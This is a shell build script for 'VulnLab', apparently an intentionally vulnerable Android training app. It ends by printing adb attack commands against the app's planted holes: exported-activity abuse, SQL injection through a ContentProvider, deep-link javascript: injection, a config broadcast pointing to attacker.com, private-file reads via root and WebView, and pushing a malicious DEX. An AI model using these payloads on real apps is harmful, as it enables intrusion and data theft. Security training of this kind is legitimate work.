#!/usr/bin/env bash
# VulnLab APK build script — no Gradle required
# Uses Android SDK build tools directly: aapt, javac, d8, apksigner, zipalign
set -euo pipefail

# ── Paths ────────────────────────────────────────────────────────────────────
APP_DIR="$(cd "$(dirname "$0")" && pwd)"
SDK="${ANDROID_SDK_ROOT:-/usr/lib/android-sdk}"
BT="$SDK/build-tools/34.0.0"
ANDROID_JAR="$SDK/platforms/android-34/android.jar"

PKG="com.vulnlab.insecureapp"
BUILD="$APP_DIR/build"
GEN="$BUILD/gen"
OBJ="$BUILD/obj"
APK_DIR="$BUILD/apk"
UNSIGNED="$BUILD/VulnLab_unsigned.apk"
ALIGNED="$BUILD/VulnLab_aligned.apk"
OUTPUT="$APP_DIR/VulnLab.apk"
KEYSTORE="$BUILD/debug.jks"

echo "=== VulnLab APK Builder ==="
echo "SDK: $SDK"
echo "Build tools: $BT"
echo "Android platform: $ANDROID_JAR"
echo ""

# ── Clean ────────────────────────────────────────────────────────────────────
echo "[1/7] Cleaning build directory..."
rm -rf "$BUILD"
mkdir -p "$GEN/$PKG" "$OBJ" "$APK_DIR"

# ── Step 2: Generate R.java via aapt ─────────────────────────────────────────
echo "[2/7] Compiling resources and generating R.java..."
"$BT/aapt" package \
    -f -m \
    -J "$GEN" \
    -M "$APP_DIR/AndroidManifest.xml" \
    -S "$APP_DIR/res" \
    -I "$ANDROID_JAR"

echo "    R.java generated at: $GEN/$PKG/R.java"

# ── Step 3: Compile Java ──────────────────────────────────────────────────────
echo "[3/7] Compiling Java sources..."
# Collect all .java files
find "$APP_DIR/src" "$GEN" -name "*.java" > "$BUILD/sources.txt"
cat "$BUILD/sources.txt"

javac \
    -source 8 -target 8 \
    -classpath "$ANDROID_JAR" \
    -d "$OBJ" \
    @"$BUILD/sources.txt"

echo "    Compiled $(find "$OBJ" -name '*.class' | wc -l) class files"

# ── Step 4: Convert to DEX via d8 ────────────────────────────────────────────
echo "[4/7] Converting .class files to DEX..."
"$BT/d8" \
    --output "$APK_DIR" \
    $(find "$OBJ" -name "*.class")

echo "    DEX written to: $APK_DIR/classes.dex"

# ── Step 5: Package APK with aapt ────────────────────────────────────────────
echo "[5/7] Packaging APK..."
"$BT/aapt" package \
    -f \
    -M "$APP_DIR/AndroidManifest.xml" \
    -S "$APP_DIR/res" \
    -I "$ANDROID_JAR" \
    -F "$UNSIGNED" \
    "$APK_DIR"

echo "    Unsigned APK: $UNSIGNED"

# ── Step 6: Align APK ────────────────────────────────────────────────────────
echo "[6/7] Aligning APK..."
"$BT/zipalign" -f 4 "$UNSIGNED" "$ALIGNED"

# ── Step 7: Sign APK ─────────────────────────────────────────────────────────
echo "[7/7] Signing APK..."
# Generate debug keystore if it doesn't exist
if [ ! -f "$KEYSTORE" ]; then
    keytool -genkeypair -v \
        -keystore "$KEYSTORE" \
        -keyalg RSA -keysize 2048 -validity 10000 \
        -alias debugkey \
        -dname "CN=VulnLab,O=VulnLab Research,C=US" \
        -storepass password -keypass password \
        -noprompt 2>/dev/null
    echo "    Keystore created: $KEYSTORE"
fi

"$BT/apksigner" sign \
    --ks "$KEYSTORE" \
    --ks-pass pass:password \
    --key-pass pass:password \
    --out "$OUTPUT" \
    "$ALIGNED"

echo ""
echo "=== BUILD SUCCESSFUL ==="
echo "APK: $OUTPUT"
ls -lh "$OUTPUT"
echo ""
echo "Install with:"
echo "  adb install $OUTPUT"
echo ""
echo "Component test commands:"
echo "  # 11.1 Admin Activity (Component Exposure)"
echo "  adb shell am start -n $PKG/.AdminActivity --ez isAdmin true --es action deleteAll"
echo ""
echo "  # 11.2 Intent Redirect"
echo "  adb shell am broadcast -a $PKG.RELAY_ACTION"
echo ""
echo "  # 11.3 ContentProvider SQL injection"
echo "  adb shell content query --uri content://$PKG.provider/users"
echo "  adb shell content query --uri content://$PKG.provider/users --where \"1=1 UNION SELECT name,sql,null,null FROM sqlite_master--\""
echo ""
echo "  # 11.4 Deep link parameter injection"
echo "  adb shell am start -a android.intent.action.VIEW -d 'vulnlab://app/reset?token=STOLEN&redirect=javascript:alert(1)'"
echo ""
echo "  # 11.5 Config broadcast takeover"
echo "  adb shell am broadcast -a $PKG.ACTION_UPDATE_CONFIG --es server_url http://attacker.com"
echo ""
echo "  # 11.6 Storage (rooted)"
echo "  adb shell su -c \"cat /data/data/$PKG/shared_prefs/vulnlab_prefs.xml\""
echo ""
echo "  # 11.8 WebView file read"
echo "  adb shell am start -n $PKG/.WebViewActivity --es url 'file:///data/data/$PKG/shared_prefs/vulnlab_prefs.xml'"
echo ""
echo "  # 11.9 Dynamic code injection"
echo "  adb shell mkdir -p /sdcard/vulnlab_plugins"
echo "  adb push malicious.dex /sdcard/vulnlab_plugins/update.dex"
